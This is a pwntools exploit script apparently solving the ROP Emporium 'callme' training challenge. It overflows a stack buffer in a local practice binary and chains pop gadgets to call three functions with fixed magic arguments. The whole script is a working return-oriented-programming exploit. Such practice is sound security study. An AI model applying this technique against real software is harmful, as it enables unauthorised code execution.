#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template callme/callme
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'callme')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
first_param = p64(0xdeadbeefdeadbeef)
second_param = p64(0xcafebabecafebabe)
third_param =p64(0xd00df00dd00df00d)

params = first_param + second_param + third_param

call_one = 0x400720
call_two = 0x400740 
call_three = 0x4006f0 

first_pop_gadget = 0x40093c
second_pop_gadget = 0x40093d 
thidrd_pop_gadget = 0x40093e 
ret_gadget = 0x4006be

useful_gadget = 0x40093c

payload = b'A'*32  + p64(0) + p64(ret_gadget) + p64(useful_gadget)+ params + p64(call_one) + p64(useful_gadget)+ params + p64(call_two) + p64(useful_gadget)+ params + p64(call_three)  

io.sendlineafter(b'> ', payload)

io.interactive()

